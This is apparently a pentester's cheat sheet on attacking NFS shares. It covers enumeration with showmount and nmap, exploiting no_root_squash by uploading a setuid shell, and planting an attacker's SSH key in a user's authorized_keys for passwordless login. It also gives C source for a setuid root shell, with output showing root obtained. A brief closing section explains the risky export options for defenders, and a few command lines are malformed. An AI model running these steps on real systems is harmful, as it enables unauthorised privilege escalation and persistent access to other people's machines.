# nfs
In order to enumerate NFS share we can use:

# Show NFS shares available
nmap --script=nfs-ls <target-ip>
;; or
showmount -e <target-ip>

showmount -a <target-ip>
showmount --all <target-ip>
showmount --exports <target-ip>
mount -t nfs target:/ /mnt/nfs/


# No Root Squash Exploit
;; If `rw,no_root_squash` is present, we can also upload and execute 
;; a sid-shell:
chown root:root sid-shell; chmod +s sid-shell


# Mount an NFS share
$ showmount -e someexample.com
;; Export list for someexample.com:
;; /backup *
$ mkdir backup
$ mount -o ro,noexec someexample.com:/backup backup
$ ls backup


# User nfspysh to mount share and create .ssh directory
nfspysh -o server=192.168.0.20:/home/user
mkdir .ssh
cd .ssh

;; Generate ssh key pair
ssh-keygen
cp id_rsa.pub /tmp/authorized_keys

;; Transfer attacker public key to host
put /tmp/authorized_keys
exit

;; Login to SSH server with no password
SSH_AUTH_SOCK=0 ssh user@192.168.0.20


If you find anything interesting, you can mount it like this:

mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS


# Recommendations
## Do Not Use the no_root_squash Option

By default, NFS shares change the root user to the nfsnobody user, an
unprivileged user account. In this way, all root-created files are owned
by nfsnobody, which prevents uploading of programs with the setuid bit
set. If no_root_squash is used, remote root users are able to change
any file on the shared file system and leave trojaned applications for
other users to inadvertently execute.

## Do Not Use the no_all_squash Option

The no_all_squash parameter is similar to no_root_squash option but
applies to non-root users. Imagine, you have a shell as nobody user;
checked /etc/exports file; no_all_squash option is present; check
/etc/passwd file; emulate a non-root user; create a suid file as that
user (by mounting using nfs). Execute the suid as nobody user and become
different user.

Note This is very dangerous if a) found on a linux box and b) you
are unprivileged user on that linux box. Above we have mounted as
read-only. However, we can mount as rw and copy a setuid program. Once
suid file is uploaded, we can execute it and become that user.


    int main(void) {
    setgid(0); setuid(0);
    execl("/bin/sh","sh",0); }

Compile it based on the architecture, give it setuid and executable
permissions as root (Remember, we mounted as root)

    chown root.root ./pwnme
    chmod u+s ./pwnme

Further, if we are unprivileged user on that Linux box, we can just execute this binary to become root.

    www-data@host:/tmp$ ./pwnme
    ./pwnme
    # id
    # uid=0(root) gid=0(root) groups=0(root),33(www-data)
